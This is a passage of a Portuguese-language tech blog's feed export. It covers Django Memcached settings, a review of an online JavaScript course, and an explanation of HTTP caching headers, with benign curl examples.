        &lt;span class="s1"&gt;&amp;#39;TIMEOUT&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;60&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;  &lt;span class="c1"&gt;# Default: 300 segundos,&lt;/span&gt;
        &lt;span class="s1"&gt;&amp;#39;KEY_PREFIX&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;djcache&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Onde:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;BACKEND:&lt;/code&gt; É o módulo responsável por se comunicar com o
  &lt;em&gt;Memcached&lt;/em&gt;. Estamos utilizando este &lt;em&gt;backend&lt;/em&gt; pois optamos pela
  &lt;em&gt;python-memcached&lt;/em&gt;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;LOCATION:&lt;/code&gt; É a porta (ou &lt;em&gt;socket&lt;/em&gt;) onde o serviço do &lt;em&gt;Memcached&lt;/em&gt;
  está respondendo. A porta padrão é a 11211.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;TIMEOUT:&lt;/code&gt; É o tempo de vida do informação “cacheada”. Acima
  informamos 60 segundos, o padrão é 5 minutos.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;KEY_PREFIX:&lt;/code&gt; É um valor que precederá todas as chaves que
  utilizarmos com o &lt;em&gt;Django&lt;/em&gt;. Bem útil para prevenir que duas
  aplicações utilizem o mesmo valor no &lt;em&gt;Memcached&lt;/em&gt; (quando este não é
  o comportamento esperado).&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;a href="https://docs.djangoproject.com/en/dev/topics/cache/#cache-arguments" title="Cache Arguments - Django Documentation"&gt;Conheça outras opções de configurações.&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;Pronto! As ferramentas estão apresentadas e estamos prontos para partir
para uma abordagem prática.&lt;/p&gt;
&lt;p&gt;O &lt;em&gt;Django&lt;/em&gt; já vem “preparado” para trabalhar com mecanismos de &lt;em&gt;cache&lt;/em&gt;.
O seu esquema de &lt;em&gt;backends&lt;/em&gt; permite que você “acople” diferentes módulos
para atender os mais exóticos mecanismos de &lt;em&gt;cache&lt;/em&gt;, sem necessariamente
precisar alterar código nas suas &lt;em&gt;apps&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;É bem verdade que o &lt;em&gt;Memcached&lt;/em&gt; é um tanto “tradicional”, e que hoje
existem alternativas mais “atrativas”, como o &lt;a href="http://redis.io/" title="Redis is an open source, advanced key-value store"&gt;&lt;em&gt;Redis&lt;/em&gt;&lt;/a&gt;. Na prática,
depende muito do cenário no qual você está inserido, por exemplo, no
&lt;a href="http://globoesporte.globo.com/" title="a melhor cobertura sobre o Futebol e Outros Esportes, no Brasil e no Mundo"&gt;&lt;em&gt;Globoesporte.com&lt;/em&gt;&lt;/a&gt; utilizamos o &lt;em&gt;Memcached&lt;/em&gt; e ele nos atende muito
bem.&lt;/p&gt;
&lt;p&gt;No próximo &lt;em&gt;post&lt;/em&gt; vamos partir para uma abordagem mais prática, cobrindo
as diferentes maneiras de utilizar &lt;em&gt;caching&lt;/em&gt; com &lt;em&gt;Django&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Até lá...&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://amix.dk/blog/post/19471" title="Um post antigo, com o comparativo entre pylibmc e python-memcached"&gt;&lt;em&gt;Amix.dk – memcached: Benchmark of 4 Python libraries&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.djangoproject.com/en/dev/topics/cache/" title="Leia a documentação do framework de cache do Django"&gt;&lt;em&gt;Django Documentation – Django’s cache framework&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://memcached.org/" title="Página principal do projeto Memcached"&gt;&lt;em&gt;Memcached.org&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://sendapatch.se/projects/pylibmc/" title="Cliente Python escrito em C para trabalhar com o Memcached"&gt;&lt;em&gt;pylibmc – Python client for memcached&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://en.wikipedia.org/wiki/Memcached" title="Leia mais sobre o Memcached no Wikipedia"&gt;&lt;em&gt;Wikipedia: Memcached&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="desenvolvimento"></category><category term="web"></category><category term="python"></category><category term="django"></category><category term="memcached"></category><category term="cache"></category></entry><entry><title>Opinião: Imersão Javascript - e-Genial</title><link href="https://klauslaube.com.br/2012/05/29/opiniao-imersao-javascript-e-genial.html" rel="alternate"></link><published>2012-05-29T22:09:07-03:00</published><updated>2012-05-29T22:09:07-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2012-05-29:/2012/05/29/opiniao-imersao-javascript-e-genial.html</id><summary type="html">&lt;p&gt;Para inaugurar a série
&lt;a href="https://klauslaube.com.br/tag/opiniao.html" title="Veja outras opiniões minhas sobre livros e cursos"&gt;Opinião&lt;/a&gt;, onde pretendo expor algumas “críticas” sobre cursos,
eventos e livros técnicos, quero compartilhar com vocês a experiência
que tive com o curso &lt;a href="http://www.edukee.com/pt/curso/javascript/turma-b/1326888846" title="Conheça a grade do curso"&gt;Imersão &lt;em&gt;Javascript&lt;/em&gt;&lt;/a&gt;, ministrado pela
&lt;a href="http://www.egenial.com/" title="Cursos online para desenvolvedores e empreendedores Web"&gt;e-Genial&lt;/a&gt;.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Antes de qualquer coisa, tenho a obrigação de dizer: O ambiente de
educação à distância, chamado &lt;a href="http://www.treinatom.com.br/pt/" title="Conheço o ambiente Ead da e-Genial"&gt;&lt;em&gt;TreinaTom&lt;/em&gt;&lt;/a&gt;, é …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Para inaugurar a série
&lt;a href="https://klauslaube.com.br/tag/opiniao.html" title="Veja outras opiniões minhas sobre livros e cursos"&gt;Opinião&lt;/a&gt;, onde pretendo expor algumas “críticas” sobre cursos,
eventos e livros técnicos, quero compartilhar com vocês a experiência
que tive com o curso &lt;a href="http://www.edukee.com/pt/curso/javascript/turma-b/1326888846" title="Conheça a grade do curso"&gt;Imersão &lt;em&gt;Javascript&lt;/em&gt;&lt;/a&gt;, ministrado pela
&lt;a href="http://www.egenial.com/" title="Cursos online para desenvolvedores e empreendedores Web"&gt;e-Genial&lt;/a&gt;.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Antes de qualquer coisa, tenho a obrigação de dizer: O ambiente de
educação à distância, chamado &lt;a href="http://www.treinatom.com.br/pt/" title="Conheço o ambiente Ead da e-Genial"&gt;&lt;em&gt;TreinaTom&lt;/em&gt;&lt;/a&gt;, é &lt;strong&gt;excelente&lt;/strong&gt;!
Recentemente tive uma experiência no mínimo “duvidosa” com o &lt;a href="http://www.adobe.com/br/products/connect/" title="Conheça o ambiente de comunicação pela Web da Adobe"&gt;&lt;em&gt;Adobe Connect&lt;/em&gt;&lt;/a&gt;...
e entre outras ferramentas disponíveis no mercado (por
exemplo, o &lt;a href="http://moodle.org/" title="O Moodle é uma ferramenta de educação open source"&gt;&lt;em&gt;Moodle&lt;/em&gt;&lt;/a&gt;), a facilidade e experiência de uso do
&lt;em&gt;TreinaTom&lt;/em&gt; se sobressai.&lt;/p&gt;
&lt;h2&gt;Expectativas&lt;/h2&gt;
&lt;p&gt;Devo ser sincero: eu não sou um dos maiores fãs do &lt;a href="https://klauslaube.com.br/tag/javascript.html" title="Leia mais sobre Javascript"&gt;&lt;em&gt;Javascript&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Como desenvolvedor &lt;a href="https://klauslaube.com.br/tag/web.html" title="Leia mais sobre Web"&gt;&lt;em&gt;web&lt;/em&gt;&lt;/a&gt;, sempre tive contato com a linguagem, e
sempre me virei na medida do possível. Mas de uns tempos para cá ficou
evidente a importância do &lt;em&gt;Javascript&lt;/em&gt;, tanto que ele já ultrapassou a
“barreira” do &lt;em&gt;front-end&lt;/em&gt; e já possui representantes em outras áreas do
desenvolvimento (por exemplo, o &lt;em&gt;Node.js&lt;/em&gt; no &lt;em&gt;back-end&lt;/em&gt;).&lt;/p&gt;
&lt;p&gt;Então, para não ficar “refém” da &lt;a href="http://jquery.com/" title="Conheça o framework jQuery"&gt;&lt;em&gt;jQuery&lt;/em&gt;&lt;/a&gt;, decidi &lt;strong&gt;estudar a
linguagem desde o básico&lt;/strong&gt;. E foi com essa expectativa que eu me
inscrevi no curso &lt;strong&gt;Imersão &lt;em&gt;Javascript&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;
&lt;h2&gt;Resultados&lt;/h2&gt;
&lt;p&gt;O &lt;a href="http://www.twitter.com/cassiomarques" title="Siga o Cássio no Twitter"&gt;&lt;em&gt;Cássio Marques&lt;/em&gt;&lt;/a&gt; foi o instrutor, e embora na primeira aula ele
não tenha conseguido “prender” a minha atenção, a partir da segunda ele
conseguiu manter uma dinâmica e ritmo muito bons.&lt;/p&gt;
&lt;p&gt;A abordagem, já focando em boas práticas e técnicas amplamente
divulgadas pelo &lt;a href="http://www.crockford.com/" title="Visite o site pessoal do Crockford"&gt;&lt;em&gt;Douglas Crockford&lt;/em&gt;&lt;/a&gt;, foi um grande diferencial. O
&lt;em&gt;Cássio&lt;/em&gt; não poupou esforços para montar um material atual, que acredito
ser útil para qualquer desenvolvedor, mesmo aqueles mais experientes com
&lt;em&gt;front-end&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;A grade foi muito boa, partindo de tipos até objetos e heranças. Mas o
que me marcou foi a utilização efetiva de exceções, a abordagem sobre
&lt;a href="https://klauslaube.com.br/2011/05/29/afinal-o-que-sao-closures.html" title="Afinal, o que são Closures?"&gt;&lt;em&gt;Closures&lt;/em&gt;&lt;/a&gt;, e a apresentação de alguns &lt;em&gt;Design Patterns&lt;/em&gt; com o
&lt;em&gt;Javascript&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;De bônus, rolou uma breve introdução ao &lt;a href="http://pivotal.github.com/jasmine/" title="BDD em Javascript"&gt;&lt;em&gt;Jasmine&lt;/em&gt;&lt;/a&gt; e ao &lt;a href="http://www.jslint.com/" title="Meça a qualidade do seu código Javascript"&gt;&lt;em&gt;JSLint&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Veredicto&lt;/h2&gt;
&lt;p&gt;Se você &lt;strong&gt;quer aprender &lt;em&gt;Javascript&lt;/em&gt;&lt;/strong&gt;, não irá se decepcionar com o
curso &lt;strong&gt;Imersão Javascript&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Já tive contato com a &lt;em&gt;e-Genial&lt;/em&gt; no curso de &lt;a href="https://klauslaube.com.br/tag/html5.html" title="Leia mais sobre HTML5"&gt;&lt;em&gt;HTML5&lt;/em&gt;&lt;/a&gt; e &lt;a href="https://klauslaube.com.br/tag/css3.html" title="Leia mais sobre CSS3"&gt;&lt;em&gt;CSS3&lt;/em&gt;&lt;/a&gt;,
que fiz no ano passado. A equipe é muito atenciosa, e material de ensino
e instrutores são de ótima qualidade.&lt;/p&gt;
&lt;p&gt;Acredito que eles possam melhorar o engajamento dos alunos, pois fora do
ambiente do &lt;em&gt;TreinaTom&lt;/em&gt; não há uma interação interessante (que vá além
do fórum, algo que tenho presenciado no curso &lt;a href="http://welcometothedjango.com.br/" title="Aprenda Python e Django na prática"&gt;&lt;em&gt;Welcome to the
Django&lt;/em&gt;&lt;/a&gt;).&lt;/p&gt;
&lt;p&gt;Resumindo: eu ví e gostei.&lt;/p&gt;</content><category term="opiniao"></category><category term="javascript"></category><category term="curso"></category></entry><entry><title>O cache e o HTTP</title><link href="https://klauslaube.com.br/2012/05/14/o-cache-e-o-http.html" rel="alternate"></link><published>2012-05-14T23:14:46-03:00</published><updated>2012-05-14T23:14:46-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2012-05-14:/2012/05/14/o-cache-e-o-http.html</id><summary type="html">&lt;p&gt;Em tempos de alta demanda, o &lt;strong&gt;&lt;em&gt;cache&lt;/em&gt;&lt;/strong&gt; pode tornar-se o melhor amigo das
aplicações &lt;a href="https://klauslaube.com.br/tag/web.html" title="Leia mais sobre Web"&gt;&lt;em&gt;web&lt;/em&gt;&lt;/a&gt;.
Através dele temos uma opção prática, acessível e barata para melhorar
performance, diminuir consumo de recursos e tempos de resposta. Qualquer
milissegundo economizado é um ponto a mais com o seu usuário, com os
mecanismos …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Em tempos de alta demanda, o &lt;strong&gt;&lt;em&gt;cache&lt;/em&gt;&lt;/strong&gt; pode tornar-se o melhor amigo das
aplicações &lt;a href="https://klauslaube.com.br/tag/web.html" title="Leia mais sobre Web"&gt;&lt;em&gt;web&lt;/em&gt;&lt;/a&gt;.
Através dele temos uma opção prática, acessível e barata para melhorar
performance, diminuir consumo de recursos e tempos de resposta. Qualquer
milissegundo economizado é um ponto a mais com o seu usuário, com os
mecanismos de busca e com o seu serviço de hospedagem.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Antes de falarmos de &lt;em&gt;cache&lt;/em&gt; em aplicações &lt;a href="https://klauslaube.com.br/tag/django.html" title="Leia mais sobre o Django"&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt; ou
&lt;a href="https://klauslaube.com.br/tag/codeigniter.html" title="Leia mais sobre Codeigniter"&gt;&lt;em&gt;Codeigniter&lt;/em&gt;&lt;/a&gt;, acho interessante falarmos sobre o uso de &lt;em&gt;cache&lt;/em&gt; com
o protocolo &lt;em&gt;HTTP&lt;/em&gt;. Afinal, é esta a primeira camada a “atacar” quando
precisamos melhorar os tempos de resposta das nossas aplicações &lt;em&gt;web&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;O que é “caching”?&lt;/h2&gt;
&lt;p&gt;Segundo &lt;a href="http://betterexplained.com/articles/how-to-optimize-your-site-with-http-caching/" title="How To Optimize Your Site With HTTP Caching"&gt;&lt;em&gt;Kalid Azad&lt;/em&gt;&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Caching is a great example of the ubiquitous time-space tradeoff
in programming. You can save time by using space to store
results.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Basicamente, &lt;strong&gt;&lt;em&gt;caching&lt;/em&gt;&lt;/strong&gt; é o ato de “economizar processamento”
armazenando os seus resultados. Um bom exemplo é o temporário do seu
navegador, onde uma imagem que não teve alteração desde o momento do seu
&lt;em&gt;download&lt;/em&gt; é resgatada do seu disco e não da &lt;em&gt;internet&lt;/em&gt;. Uma tarefa mais
rápida e menos custosa.&lt;/p&gt;
&lt;p&gt;Logo, entendemos que o &lt;strong&gt;&lt;em&gt;cache&lt;/em&gt;&lt;/strong&gt; é um local em disco ou memória
utilizado para armazenar estes resultados. Ele pode se aplicar ao
&lt;em&gt;front-end&lt;/em&gt; (como ilustrado no exemplo acima), ou ao &lt;em&gt;back-end&lt;/em&gt;, através
dos servidores &lt;em&gt;web&lt;/em&gt;, como o &lt;em&gt;Apache&lt;/em&gt; e o &lt;a href="https://klauslaube.com.br/2011/12/19/nginx-poderoso-rapido-facil.html" title="Leia mais sobre Nginx"&gt;&lt;em&gt;Nginx&lt;/em&gt;&lt;/a&gt;, ou através de
ferramentas mais específicas, como &lt;em&gt;Memcached&lt;/em&gt; e &lt;em&gt;Redis&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Assim como a definição de &lt;a href="https://klauslaube.com.br/2012/04/05/entendendo-os-cookies-e-sessoes.html" title="Entendendo os Cookies e Sessões"&gt;&lt;em&gt;cookies&lt;/em&gt; e sessões&lt;/a&gt;, a utilização de
&lt;em&gt;cache&lt;/em&gt; nos navegadores &lt;em&gt;Web&lt;/em&gt; é feita através de informações
transmitidas pelo cabeçalho da requisição e resposta.&lt;/p&gt;
&lt;p&gt;Existem quatro tipos de cabeçalhos específicos para &lt;em&gt;cache&lt;/em&gt; em &lt;em&gt;HTTP&lt;/em&gt;.
Mas todos partem da premissa que o arquivo em questão (pode ser um
documento, imagem, &lt;em&gt;script&lt;/em&gt;, etc) já está armazenado no disco do
internauta, acessível ao navegador.&lt;/p&gt;
&lt;h2&gt;Last-Modified&lt;/h2&gt;
&lt;p&gt;Com o &lt;code&gt;Last-Modified&lt;/code&gt;, o navegador informa ao servidor que irá baixar
um arquivo desde que a sua data de modificação seja diferente da data do
arquivo armazenado. Na requisição é passado o cabeçalho
&lt;code&gt;If-Modified-Since&lt;/code&gt;, e se a data do arquivo no servidor for mais
recente, o navegador faz um novo &lt;em&gt;download&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Vamos fazer uma requisição tendo como resposta um cabeçalho
&lt;code&gt;Last-Modified&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ curl -i -I http://klauslaube.com.br/media/blog/security.jpg

HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
...
Date: Tue, &lt;span class="m"&gt;01&lt;/span&gt; May &lt;span class="m"&gt;2012&lt;/span&gt; &lt;span class="m"&gt;19&lt;/span&gt;:20:27 GMT
Last-Modified: Sat, &lt;span class="m"&gt;07&lt;/span&gt; Apr &lt;span class="m"&gt;2012&lt;/span&gt; &lt;span class="m"&gt;17&lt;/span&gt;:51:10 GMT
...
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Uma vez que o arquivo esteja em disco, o navegador tem como informar a
data da última alteração. Então, fazemos uma nova requisição ao arquivo
&lt;code&gt;security.jpg&lt;/code&gt;, passando esta data no cabeçalho &lt;code&gt;If-Modified-Since&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ curl -i -H &lt;span class="s2"&gt;&amp;quot;If-Modified-Since: Sat, 07 Apr 2012 17:51:10 GMT&amp;quot;&lt;/span&gt; http://klauslaube.com.br/media/blog/security.jpg

HTTP/1.1 &lt;span class="m"&gt;304&lt;/span&gt; Not Modified
Date: Tue, &lt;span class="m"&gt;01&lt;/span&gt; May &lt;span class="m"&gt;2012&lt;/span&gt; &lt;span class="m"&gt;19&lt;/span&gt;:22:00 GMT
Last-Modified: Sat, &lt;span class="m"&gt;07&lt;/span&gt; Apr &lt;span class="m"&gt;2012&lt;/span&gt; &lt;span class="m"&gt;17&lt;/span&gt;:51:10 GMT
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;A resposta &lt;code&gt;304 Not Modified&lt;/code&gt; não traz o conteúdo do arquivo em seu
corpo, e é através desta resposta que o navegador sabe que não precisa
fazer o &lt;em&gt;download&lt;/em&gt; do arquivo, utilizando assim a versão que está em seu
&lt;em&gt;cache&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;ETag&lt;/h2&gt;
&lt;p&gt;O modo como a &lt;code&gt;ETag&lt;/code&gt; funciona é bem parecido com o conceito do
&lt;code&gt;Last-Modified&lt;/code&gt;. A diferença está no método de comparação: ao invés de
fazer comparações pela data, são realizadas comparações através de
identificadores únicos, atribuídos aos arquivos envolvidos nas
requisições.&lt;/p&gt;
&lt;p&gt;Quando trabalhamos com &lt;code&gt;ETag&lt;/code&gt;, obtemos respostas com o seguinte
cabeçalho:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ curl -i -I http://localhost/exemplo-cache.html

HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
...
Date: Tue, &lt;span class="m"&gt;01&lt;/span&gt; May &lt;span class="m"&gt;2012&lt;/span&gt; &lt;span class="m"&gt;19&lt;/span&gt;:46:18 GMT
ETag: &lt;span class="s2"&gt;&amp;quot;2c6b0d8-13-4befe555d6f80&amp;quot;&lt;/span&gt;
...
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;É através do valor &lt;code&gt;2c6b0d8-13-4befe555d6f80&lt;/code&gt; que navegador e servidor
saberão se aquele arquivo em questão já está armazenado em &lt;em&gt;cache&lt;/em&gt;. Isso
é possível através do cabeçalho &lt;code&gt;If-None-Match&lt;/code&gt;, enviado pelo
navegador na requisição:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ curl -i -I -H &lt;span class="s2"&gt;&amp;quot;If-None-Match: \&amp;quot;2c6b0d8-13-4befe555d6f80\&amp;quot;&amp;quot;&lt;/span&gt; http://localhost/exemplo-cache.html

HTTP/1.1 &lt;span class="m"&gt;304&lt;/span&gt; Not Modified
Date: Tue, &lt;span class="m"&gt;01&lt;/span&gt; May &lt;span class="m"&gt;2012&lt;/span&gt; &lt;span class="m"&gt;19&lt;/span&gt;:50:40 GMT
ETag: &lt;span class="s2"&gt;&amp;quot;2c6b0d8-13-4befe555d6f80&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Uma vez que o valor bata com o identificador do arquivo, o servidor
informa ao navegador que não houve alterações. Então, o navegador
utiliza a versão do arquivo que está no temporário.&lt;/p&gt;
&lt;h2&gt;Expires&lt;/h2&gt;
&lt;p&gt;A grande desvantagem dos dois métodos acima é que necessitamos consultar
o servidor para verificar a procedência do arquivo. Com o &lt;code&gt;Expires&lt;/code&gt; e
&lt;code&gt;max-age&lt;/code&gt; a “data de validade” vem junto com a requisição, logo, o
navegador já sabe quando o arquivo em seu &lt;em&gt;cache&lt;/em&gt; irá expirar, e só
voltará a consultar o servidor quando este tempo for alcançado.&lt;/p&gt;
&lt;p&gt;Com o &lt;code&gt;Expires&lt;/code&gt;, o servidor retorna no cabeçalho da resposta uma data
de validade para um determinado arquivo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ curl -i -I http://klauslaube.com.br/media/blog/cookies.jpg

HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
Date: Tue, &lt;span class="m"&gt;08&lt;/span&gt; May &lt;span class="m"&gt;2012&lt;/span&gt; &lt;span class="m"&gt;01&lt;/span&gt;:49:13 GMT
...
Expires: Thu, &lt;span class="m"&gt;31&lt;/span&gt; Dec &lt;span class="m"&gt;2037&lt;/span&gt; &lt;span class="m"&gt;23&lt;/span&gt;:55:55 GMT
...
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Solicitando uma nova requisição para este mesmo arquivo, o navegador
analisará a data local e a data de expiração. Se a data atual for maior
que &lt;code&gt;Expires&lt;/code&gt;, aí sim o navegador se comunicará com o servidor &lt;em&gt;web&lt;/em&gt;,
e fará um novo &lt;em&gt;download&lt;/em&gt; do arquivo.&lt;/p&gt;
&lt;h2&gt;max-age&lt;/h2&gt;
&lt;p&gt;Embora o &lt;code&gt;max-age&lt;/code&gt; possa parecer um pouco enigmático, ele é (na minha
opinião) uma solução mais elegante e fácil de implementar que o
&lt;code&gt;Expires&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Com o &lt;code&gt;Expires&lt;/code&gt;, temos que informar uma data “absoluta” no cabeçalho,
ou seja, somos obrigados a dizer o dia da semana, mês, ano, hora, minuto
e até mesmo segundo em que determinado arquivo irá expirar. Logo, temos
o trabalho de interpretar a data da requisição (seja no servidor ou na
aplicação) adicionando o tempo que desejamos de &lt;em&gt;cache&lt;/em&gt; e imprimindo
este valor por extenso.&lt;/p&gt;
&lt;p&gt;Com o &lt;code&gt;max-age&lt;/code&gt; temos a opção de utilizar datas “relativas”, ou seja,
podemos dizer ao navegador que o arquivo irá expirar em 1 dia (em
segundos):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ curl -i http://localhost/exemplo-cache.html

HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
Date: Mon, &lt;span class="m"&gt;14&lt;/span&gt; May &lt;span class="m"&gt;2012&lt;/span&gt; &lt;span class="m"&gt;17&lt;/span&gt;:04:29 GMT
...
Cache-Control: max-age&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;86400&lt;/span&gt;, must-revalidate
...
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Como você já deve ter reparado, não existe um índice de cabeçalho
específico chamado &lt;code&gt;max-age&lt;/code&gt;. Ele é na verdade um valor do índice
&lt;code&gt;Cache-Control&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;O valor &lt;code&gt;must-revalidate&lt;/code&gt; solicita aos mecanismos de &lt;em&gt;cache&lt;/em&gt; (você
pode estar “atrás” de um &lt;em&gt;proxy&lt;/em&gt;) o seguinte: Quando o arquivo
ultrapassar o &lt;code&gt;max-age&lt;/code&gt;, o &lt;em&gt;user-agent&lt;/em&gt; deve revalidar o conteúdo
junto ao servidor &lt;em&gt;Web&lt;/em&gt;. Embora esse seja o comportamento esperado por
estes mecanismos, tornar esta informação explícita pode garantir que
ferramentas mais “obscuras” sigam este comportamento.&lt;/p&gt;
&lt;h3&gt;Um pouco sobre o Cache-Control&lt;/h3&gt;
&lt;p&gt;O &lt;code&gt;Cache-Control&lt;/code&gt; foi adicionado na especificação do
&lt;a href="http://www.w3.org/Protocols/rfc2616/rfc2616.html" title="Conheça o protocolo HTTP versão 1.1"&gt;&lt;em&gt;HTTP 1.1&lt;/em&gt;&lt;/a&gt; com a finalidade de contornar
as limitações do &lt;code&gt;Expires&lt;/code&gt;, e também de melhorar o controle sobre o
&lt;em&gt;cache&lt;/em&gt; de determinado conteúdo por diferentes tipos de mecanismos.&lt;/p&gt;
&lt;p&gt;Além do uso do &lt;code&gt;max-age&lt;/code&gt;, é através do &lt;code&gt;Cache-Control&lt;/code&gt; que podemos
especificar o comportamento de &lt;em&gt;cache&lt;/em&gt; para o navegador (&lt;code&gt;private&lt;/code&gt;),
para algum &lt;em&gt;proxy&lt;/em&gt;, servidores intermediários ou requisições &lt;em&gt;HTTPS&lt;/em&gt;
(&lt;code&gt;public&lt;/code&gt;), ou ainda informarmos que não queremos fazer &lt;em&gt;caching&lt;/em&gt; do
conteúdo (&lt;code&gt;no-cache&lt;/code&gt;).&lt;/p&gt;
&lt;p&gt;&lt;a href="http://www.mnot.net/cache_docs/#CACHE-CONTROL" title="Tutorial sobre HTTP caching"&gt;Leia mais sobre &lt;em&gt;Cache-Control&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Vale ressaltar que o &lt;code&gt;Cache-Control&lt;/code&gt; tem precedência sobre o
&lt;code&gt;Expires&lt;/code&gt;.&lt;/p&gt;
&lt;h2&gt;Qual forma utilizar?&lt;/h2&gt;
&lt;p&gt;A resposta é: depende do cenário.&lt;/p&gt;
&lt;p&gt;Para servir arquivos estáticos, a &lt;a href="http://www.webfaction.com/" title="Smarter web hosting"&gt;&lt;em&gt;Webfaction&lt;/em&gt;&lt;/a&gt; utiliza os cabeçalhos
&lt;code&gt;Last-Modified&lt;/code&gt;, &lt;code&gt;Expires&lt;/code&gt; e &lt;code&gt;max-age&lt;/code&gt;, atribuindo aos dois
últimos valores absurdos de &lt;em&gt;cache&lt;/em&gt; (por exemplo, datas de expiração
para o ano de 2037). Isso garante que o seu navegador, &lt;em&gt;proxy&lt;/em&gt; ou
&lt;em&gt;gateway&lt;/em&gt; “nunca esqueça” de uma determina imagem, folha de estilos ou
arquivo &lt;a href="https://klauslaube.com.br/tag/javascript.html" title="Leia mais sobre Javascript"&gt;&lt;em&gt;Javascript&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Mesmo com o uso do &lt;code&gt;max-age&lt;/code&gt;, é interessante ter o &lt;code&gt;Expires&lt;/code&gt; como
alternativa, caso o navegador do internauta não compreenda instruções de
&lt;code&gt;Cache-Control&lt;/code&gt;. Já a utilização do &lt;code&gt;Last-Modified&lt;/code&gt;, segundo o &lt;a href="http://www.askapache.com/htaccess/apache-speed-last-modified.html" title="Remove Last-Modified Header"&gt;&lt;em&gt;Ask Apache&lt;/em&gt;&lt;/a&gt;,
não é lá muito interessante pois a sua utilização faz com
que alguns navegadores ignorem o cabeçalho &lt;code&gt;Expires&lt;/code&gt;. Um argumento
mais relevante é a eliminação de procedimentos de validação (como o
&lt;code&gt;If-Modified-Since&lt;/code&gt; e &lt;code&gt;If-None-Match&lt;/code&gt;), deixando a cargo apenas do
&lt;code&gt;Expires&lt;/code&gt; e &lt;code&gt;max-age&lt;/code&gt; determinar o tempo de vida do estático em
&lt;em&gt;cache&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Em páginas dinâmicas, onde um &lt;em&gt;cache&lt;/em&gt; de 5 ou 10 minutos possa ser
aplicado, o &lt;code&gt;max-age&lt;/code&gt; com &lt;code&gt;Expires&lt;/code&gt; é fundamental. Já em páginas que
necessitam de um conteúdo em tempo real, ou páginas que utilizam
informações de &lt;em&gt;cookies&lt;/em&gt; ou sessões, a ausência de &lt;em&gt;cache&lt;/em&gt; é
justificável.&lt;/p&gt;
